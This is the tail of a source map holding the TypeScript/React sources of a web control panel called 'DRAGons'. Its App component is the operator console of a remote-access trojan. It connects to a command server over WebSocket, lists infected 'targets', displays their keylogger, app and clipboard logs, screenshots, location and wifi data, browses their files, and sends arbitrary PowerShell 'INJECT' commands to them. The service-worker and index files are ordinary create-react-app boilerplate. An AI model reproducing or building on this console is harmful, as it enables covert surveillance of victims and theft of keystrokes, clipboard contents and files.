document.createElement(\"a\");\r\n  document.body.appendChild(a);\r\n  a.style.display = \"none\";\r\n  const blob = new Blob(data, {type: \"octet/stream\"});\r\n  const url = URL.createObjectURL(blob);\r\n  a.href = url;\r\n  a.download = name;\r\n  a.click();\r\n  URL.revokeObjectURL(url);\r\n}\r\n\r\nexport const base64ToBytes = (base64: string) => {\r\n  const binaryStr = atob(base64);\r\n  const bytes = new Uint8Array(binaryStr.length);\r\n  for (let i = 0; i < binaryStr.length; i++) {\r\n    bytes[i] = binaryStr.charCodeAt(i);\r\n  }\r\n  return bytes;\r\n}","import React, { Component } from \"react\";\r\nimport { DirectoryInfo } from \"../../models/directoryInfo\";\r\nimport Tile from \"../../components/Tile\";\r\nimport Text from \"../../components/Text\";\r\nimport { css } from \"emotion\";\r\nimport IconButton from \"../../components/IconButton\";\r\n\r\nconst styles = {\r\n  file: css`\r\n    display: flex;\r\n    align-items: center;\r\n    cursor: pointer;\r\n    padding: 4px 5px;\r\n    transition: all 0.2s ease;\r\n    :hover {\r\n      background: rgba(255, 255, 255, 0.1);\r\n    }\r\n    :active {\r\n      background: rgba(255, 255, 255, 0.2);\r\n    }\r\n  `,\r\n  fileIcon: css`\r\n    user-select: none;\r\n    font-size: 18px;\r\n    padding: 0 8px;\r\n  `\r\n};\r\n\r\ninterface FileExplorerProps {\r\n  directory: DirectoryInfo;\r\n  onNavigate: (path: string) => void;\r\n}\r\n\r\nclass FileExplorer extends Component<FileExplorerProps> {\r\n  state = {\r\n    showDrives: false\r\n  };\r\n\r\n  onBack = () => {\r\n    if (this.props.directory.type !== \"ROOT\") {\r\n      const parts = this.props.directory.path.split(/\\\\/g);\r\n      this.props.onNavigate(parts.slice(0, parts.length - 1).join(\"\\\\\"));\r\n    } else {\r\n      this.setState({ showDrives: true });\r\n    }\r\n  };\r\n\r\n  onChangeDrive = (path: string) => {\r\n    this.setState({ showDrives: false });\r\n    this.props.onNavigate(path);\r\n  };\r\n\r\n  render() {\r\n    const { directory, onNavigate } = this.props;\r\n\r\n    const fileView = directory.files.map((f, i) => (\r\n      <div\r\n        className={styles.file}\r\n        key={i}\r\n        onClick={() => onNavigate(directory.path + \"\\\\\" + f.name)}\r\n      >\r\n        <i className={`material-icons ${styles.fileIcon}`}>\r\n          {f.type === \"FILE\" ? \"insert_drive_file\" : \"folder\"}\r\n        </i>\r\n        <Text color=\"darker\">{f.name}</Text>\r\n      </div>\r\n    ));\r\n\r\n    const driveView = directory.drives.map((path, i) => (\r\n      <div className={styles.file} key={i} onClick={() => this.onChangeDrive(path)}>\r\n        <i className={`material-icons ${styles.fileIcon}`}>devices</i>\r\n        <Text color=\"darker\" style={{ userSelect: \"none\" }}>\r\n          {path.split(\":\")[0]}\r\n        </Text>\r\n      </div>\r\n    ));\r\n\r\n    const content = this.state.showDrives ? driveView : fileView;\r\n\r\n    return (\r\n      <Tile\r\n        collapsible={false}\r\n        divider={false}\r\n        rawContent={true}\r\n        title={directory.path}\r\n        style={{ gridArea: \"files\", overflow: \"auto\" }}\r\n        leading={\r\n          <IconButton onClick={this.onBack} style={{ marginRight: 10 }}>\r\n            <i className=\"material-icons\" style={{ fontSize: 17 }}>\r\n              arrow_back\r\n            </i>\r\n          </IconButton>\r\n        }\r\n      >\r\n        <div style={{ margin: \"8px\" }}>{content}</div>\r\n      </Tile>\r\n    );\r\n  }\r\n}\r\n\r\nexport default FileExplorer;\r\n","import React, { Component, Fragment } from \"react\";\r\n\r\nimport Clock from \"./components/Clock\";\r\nimport Text from \"./components/Text\";\r\n\r\nimport * as styles from \"./App.styles\";\r\nimport NetworkStatus from \"./ui/general/NetworkStatus\";\r\nimport { Action } from \"./models/action\";\r\nimport { Target } from \"./models/target\";\r\nimport DeviceView from \"./ui/target/DeviceView\";\r\nimport LocationView from \"./ui/target/LocationView\";\r\nimport NetworkView from \"./ui/target/NetworkView\";\r\nimport WifiView from \"./ui/target/WifiView\";\r\nimport ExplorerView from \"./ui/target/ExplorerView\";\r\nimport TargetListView from \"./ui/general/TargetListView\";\r\nimport Terminal from \"./ui/general/Terminal\";\r\nimport { StdoutLine } from \"./models/stdoutLine\";\r\nimport LoggerView from \"./ui/target/LoggerView\";\r\nimport { base64ToBytes, downloadBytes } from \"./services/encoding\";\r\nimport FileExplorer from \"./ui/target/FileExplorer\";\r\n\r\nconst localeOptions = {\r\n  year: \"numeric\",\r\n  month: \"numeric\",\r\n  day: \"numeric\",\r\n  hour: \"numeric\",\r\n  minute: \"numeric\"\r\n};\r\n\r\nclass AppState {\r\n  online: boolean = false;\r\n  target?: Target;\r\n  targets: string[] = [];\r\n  stdout: StdoutLine[] = [];\r\n  img: string = \"\";\r\n}\r\n\r\nclass App extends Component<{}, AppState> {\r\n  static url = \"ws://dragons-land.herokuapp.com/ws\";\r\n\r\n  private websocket: WebSocket;\r\n  private terminalInput = React.createRef<HTMLInputElement>();\r\n\r\n  state = new AppState();\r\n\r\n  constructor(props: any) {\r\n    super(props);\r\n    const {hostname} = window.location;\r\n    if (hostname === \"localhost\" || hostname === \"127.0.0.1\") App.url = \"ws://localhost/ws\";\r\n    this.websocket = new WebSocket(App.url);\r\n    this.initConnection();\r\n\r\n    window.addEventListener(\"keydown\", (ev: KeyboardEvent) => {\r\n      if (ev.ctrlKey && ev.shiftKey && ev.key === \"P\") {\r\n        ev.preventDefault();\r\n      }\r\n    });\r\n  }\r\n\r\n  initConnection() {\r\n    this.websocket.removeEventListener(\"open\", this.onOpen);\r\n    this.websocket.removeEventListener(\"close\", this.onClose);\r\n    this.websocket.removeEventListener(\"message\", this.onMessage);\r\n    this.websocket = new WebSocket(App.url);\r\n    this.websocket.addEventListener(\"open\", this.onOpen);\r\n    this.websocket.addEventListener(\"close\", this.onClose);\r\n    this.websocket.addEventListener(\"message\", this.onMessage);\r\n  }\r\n\r\n  onOpen = () => {\r\n    this.setState({ online: true });\r\n    this.send({ type: \"CONNECT_CLIENT\" });\r\n  };\r\n\r\n  onClose = () => {\r\n    this.setState(new AppState());\r\n  };\r\n\r\n  onMessage = (ev: MessageEvent) => {\r\n    const data = JSON.parse(ev.data);\r\n    const { type, payload } = data;\r\n    console.log(data);\r\n    if (type === \"DATA\") {\r\n      const { targets }: { targets: string[] } = payload;\r\n      this.setState({ targets });\r\n      const { target } = this.state;\r\n      if (target && targets.indexOf(target.key) === -1)\r\n        this.setState({ target: undefined });\r\n    } else if (type === \"TARGET_CONNECTED\") {\r\n      this.setState({\r\n        target: {...payload, key: data.key},\r\n      });\r\n    } else if (type === \"STDOUT\") {\r\n      const { error, stdout } = payload;\r\n      this.setState(\r\n        {\r\n          stdout: [\r\n            ...this.state.stdout,\r\n            ...stdout.split(\"\\n\").map((value: string) => ({ error, value }))\r\n          ]\r\n        },\r\n        () => {\r\n          this.terminalInput.current!.scrollIntoView();\r\n        }\r\n      );\r\n    } else if (type == \"LOG\") {\r\n      console.log(payload);\r\n      let { target } = this.state;\r\n      if (target) {\r\n        const keylog: string[] = \"keylog\" in target ? target.keylog : [];\r\n        target.keylog = [...keylog, ...payload.keylog];\r\n        const applog: string[] = \"applog\" in target ? target.applog : [];\r\n        target.applog = [...applog, ...payload.applog];\r\n        const clipboardLog: string[] =\r\n          \"clipboardLog\" in target ? target.clipboardLog : [];\r\n        target.clipboardLog = [...clipboardLog, ...payload.clipboardLog];\r\n        this.setState({\r\n          target: target\r\n        });\r\n      }\r\n    } else if (type == \"SCREENSHOT\") {\r\n      this.setState({img: payload});\r\n      const bytes = base64ToBytes(payload);\r\n      // downloadBytes(\r\n      //   [bytes],\r\n      //   `${new Date().toLocaleString(\"en-GB\", localeOptions)}.jpg`\r\n      // );\r\n    } else if (type == \"GET_DIRECTORY\") {   \r\n      const { target } = this.state;\r\n      if (target && payload) {\r\n        this.setState({ target: {...target, directoryInfo: payload} });\r\n      }\r\n    } else {\r\n      console.log(data);\r\n    }\r\n  };\r\n\r\n  send = (obj: Action) => {\r\n    console.log(obj);\r\n    this.websocket.send(JSON.stringify(obj));\r\n  }\r\n\r\n  sendToTarget = (action: Action, target?: string) => {\r\n    if (!target && this.state.target) target = this.state.target!.key;\r\n\r\n    return this.send({\r\n      ...action,\r\n      to: target\r\n    });\r\n  };\r\n\r\n  get targetConnected(): boolean {\r\n    return !!this.state.target;\r\n  }\r\n\r\n  selectTarget = (target: string) => {\r\n    if (!this.state.target || this.state.target.key !== target) {\r\n      this.send({\r\n        type: \"CONNECT_TO_TARGET\",\r\n        payload: target\r\n      });\r\n    }\r\n  };\r\n\r\n  executeCommand = (input: string) => {\r\n    const parts = input.split(\" \");\r\n    const action = parts[0];\r\n    let rest = parts.slice(1, parts.length);\r\n\r\n    if (action === \"clear\") {\r\n      this.setState({ stdout: [] });\r\n    } else if (action === \"$\") {\r\n        switch(rest[0]) {\r\n          case \"msg\":\r\n            const msg = rest.slice(1).join(\" \")\r\n            this.sendToTarget({\r\n              type: \"INJECT\",\r\n              payload: `\r\n              [void] [System.Reflection.Assembly]::LoadWithPartialName(\"Microsoft.VisualBasic\") \r\n              [Microsoft.VisualBasic.Interaction]::MsgBox(\"${msg}\", \"OkOnly,SystemModal,Information,DefaultButton1\", \"\")\r\n              `\r\n            });\r\n        }\r\n    } else {\r\n      console.log(\"sending\");\r\n\r\n      this.sendToTarget({\r\n        type: \"INJECT\",\r\n        payload: input\r\n      });\r\n    }\r\n  };\r\n\r\n  clear = (key: string) => () => {\r\n    const { target } = this.state;\r\n    if (target) {\r\n      if (key === \"keylog\") target.keylog = [];\r\n      if (key === \"applog\") target.applog = [];\r\n      if (key === \"clipboardLog\") target.clipboardLog = [];\r\n      this.setState({ target });\r\n    }\r\n  };\r\n\r\n  handleContextMenu = (key: string, action: string) => {\r\n    this.sendToTarget({ type: action.replace(\" \", \"_\") }, key);\r\n  };\r\n\r\n  navigateDirectory = (path: string) => {\r\n    console.log(path);\r\n    \r\n    this.sendToTarget({type: \"GET_DIRECTORY\", payload: path});\r\n  }\r\n\r\n  render() {\r\n    const { online, target, targets, img } = this.state;\r\n\r\n    let right = <div />;\r\n    let bottom = <div />;\r\n\r\n    if (target) {\r\n      right = (\r\n        <div className={styles.right}>\r\n          <DeviceView target={target} />\r\n          <NetworkView target={target} />\r\n          {\"location\" in target && Object.keys(target.location!).length > 0 && (\r\n            <LocationView target={target} />\r\n          )}\r\n          <WifiView target={target} />\r\n          <ExplorerView target={target} />\r\n        </div>\r\n      );\r\n      bottom = (\r\n        <Fragment>\r\n          {\"keylog\" in target && (\r\n            <LoggerView\r\n              title=\"KEY LOGGER\"\r\n              style={{ gridArea: \"keylogger\" }}\r\n              log={target.keylog}\r\n              onClear={this.clear(\"keylog\")}\r\n            />\r\n          )}\r\n          {\"applog\" in target && (\r\n            <LoggerView\r\n              title=\"APP LOGGER\"\r\n              style={{ gridArea: \"applogger\" }}\r\n              log={target.applog}\r\n              onClear={this.clear(\"applog\")}\r\n            />\r\n          )}\r\n          {\"clipboardLog\" in target && (\r\n            <LoggerView\r\n              title=\"CLIPBOARD\"\r\n              style={{ gridArea: \"clipboardlogger\" }}\r\n              log={target.clipboardLog}\r\n              onClear={this.clear(\"clipboardLog\")}\r\n            />\r\n          )}\r\n          {\"directoryInfo\" in target && (\r\n            <FileExplorer onNavigate={this.navigateDirectory} directory={target.directoryInfo!} />\r\n          )}\r\n        </Fragment>\r\n      );\r\n    }\r\n\r\n    return (\r\n      <div className={styles.grid}>\r\n        <div className={styles.top}>\r\n          <Text font=\"Major Mono Display\" weight={500} size=\"18px\">\r\n            DRAGons\r\n          </Text>\r\n        </div>\r\n        <div className={styles.main}>\r\n          <Terminal\r\n            inputRef={this.terminalInput}\r\n            onEnter={this.executeCommand}\r\n            stdout={this.state.stdout}\r\n          />\r\n        </div>\r\n        <div className={styles.left}>\r\n          <Clock />\r\n          <NetworkStatus\r\n            online={online}\r\n            targetConnected={this.targetConnected}\r\n          />\r\n          <TargetListView\r\n            onMenu={this.handleContextMenu}\r\n            targets={targets}\r\n            target={target}\r\n            onSelect={this.selectTarget}\r\n          />\r\n           {img && <img width={200} src={`data:image/png;base64, ${img}`} alt=\"Red dot\" /> }\r\n        </div>\r\n        {right}\r\n        <div className={styles.bottom}>{bottom}</div>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default App;\r\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read http://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.1/8 is considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\ntype Config = {\n  onSuccess?: (registration: ServiceWorkerRegistration) => void;\n  onUpdate?: (registration: ServiceWorkerRegistration) => void;\n};\n\nexport function register(config?: Config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(\n      (process as { env: { [key: string]: string } }).env.PUBLIC_URL,\n      window.location.href\n    );\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit http://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl: string, config?: Config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See http://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl: string, config?: Config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl)\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready.then(registration => {\n      registration.unregister();\n    });\n  }\n}\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker';\n\nReactDOM.render(<App />, document.getElementById('root'));\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: http://bit.ly/CRA-PWA\nserviceWorker.unregister();\n"],"sourceRoot":""}